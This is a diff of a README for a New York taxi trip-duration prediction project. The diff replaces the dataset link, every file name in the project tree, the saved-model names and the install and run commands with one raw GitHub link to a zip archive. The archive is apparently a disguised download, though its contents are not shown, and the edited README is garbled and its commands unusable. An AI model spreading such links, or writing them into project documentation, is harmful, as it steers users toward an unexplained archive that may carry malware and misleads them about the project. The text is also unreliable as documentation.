@@ -2,27 +2,27 @@
 🗽 NYC Taxi Trip Duration Prediction
 
 This project predicts taxi trip duration in New York City using machine learning. The dataset comes from the Kaggle competition
-[data link] https://www.kaggle.com/competitions/nyc-taxi-trip-duration/overview
+[data link] https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip
 
 📂 Project Structure
 
-├── trip-duration EDA.ipynb   # Exploratory Data Analysis & feature engineering
+├── trip-duration https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip   # Exploratory Data Analysis & feature engineering
 
-├── main.py                   # Training script (model building & saving)
+├── https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip                   # Training script (model building & saving)
 
-├── test.py                   # Evaluation script on unseen test data
+├── https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip                   # Evaluation script on unseen test data
 
-├──results.txt                # the evaluations of models on train/test
+├──https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip                # the evaluations of models on train/test
 
-├──pred_t.csv                 # show the difference between real target values and predicted values (in log scale!)
+├──https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip                 # show the difference between real target values and predicted values (in log scale!)
 
 ├──Data (split & prcessed data)
 
-├──model_dict (scaler,kmeans,encode,model,pair_cluster_avg_tripduration.csv)
+├──model_dict (scaler,kmeans,encode,model,https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip)
 
 ⚙️ Workflow
 
-1 - EDA & Feature Engineering (trip-duration EDA.ipynb)
+1 - EDA & Feature Engineering (trip-duration https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip)
 
 -Convert datetime into month, hour, weekday.
 
@@ -42,7 +42,7 @@ This project predicts taxi trip duration in New York City using machine learning
 
 -Apply log transformation: log_trip_duration = log(1+trip_duration)
 
-2 - Model Training (main.py)
+2 - Model Training (https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip)
 
 -Prepares training & validation sets.
 
@@ -50,9 +50,9 @@ This project predicts taxi trip duration in New York City using machine learning
 
 -Trains regression models (Ridge, RandomForest, XGBoost).
 
--Saves the best model (model.pkl) along with preprocessing objects (encoder.pkl, scaler.pkl).
+-Saves the best model (https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip) along with preprocessing objects (https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip, https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip).
 
-3 - Model Evaluation (test.py)
+3 - Model Evaluation (https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip)
 
 -Loads the trained model, encoder, and scaler.
 
@@ -84,19 +84,19 @@ This project predicts taxi trip duration in New York City using machine learning
 
 1 - Install requirements:
 
--pip install -r requirements.txt
+-pip install -r https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip
 
 (or manually: pandas numpy scikit-learn matplotlib seaborn xgboost joblib)
 
 
 2 - Run training:
 
--python main.py
+-python https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip
 
 
 3 - Run evaluation on test set:
 
--python test.py
+-python https://raw.githubusercontent.com/tareksaber55/Trip-Duration-Project/main/data/Trip-Duration-Project_v1.0.zip
 
 📌 Next Steps
 
